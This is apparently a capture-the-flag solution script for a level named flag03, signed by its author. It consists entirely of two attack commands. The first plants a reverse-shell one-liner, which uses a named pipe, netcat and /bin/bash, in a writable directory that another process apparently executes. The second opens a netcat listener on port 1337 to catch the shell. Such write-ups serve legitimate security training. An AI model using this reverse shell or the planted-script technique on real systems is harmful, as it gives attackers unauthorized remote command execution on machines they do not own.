# Solution by Farzad E. (me@dNetGuru.com)  / @dNetGuru

echo "mknod bp p && /bin/nc 127.0.10.205 1337 0<bp | /bin/bash 1>bp" > /home/flag03/writable.d/dnetg
nc -l 1337 -v -v